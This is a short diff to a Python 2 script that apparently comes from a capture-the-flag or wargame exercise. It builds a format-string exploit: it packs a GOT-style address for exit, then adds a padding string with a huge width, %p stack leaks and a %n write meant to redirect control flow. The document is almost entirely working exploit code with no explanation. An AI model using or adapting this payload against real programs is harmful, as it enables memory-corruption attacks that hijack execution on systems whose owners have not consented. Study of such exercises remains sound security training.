@@ -1,5 +1,9 @@
 import struct
 #padding = "%.42BCCCCDDDDEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN %p %p %p %p %p %p %p %p %n"
-#padding =  "%.134513886dEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN %p %p %p %p %p %p %p %p %n %p %p"
+padding =  "%.1000000000dEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN %p %p %p %p %p %p %p %p %n %p %p"
 # #exit jmp : 0x80497e0
-# addr = struct.pack("I", 0x80497e0)                                                                                                                                                                                                              #char to print : 0x080484de                                                                                                                                                                                                                     print addr + padding 
+addr = struct.pack("I", 0x80497e0)     
+
+print addr + padding
+
+# max we can print is around 860 million
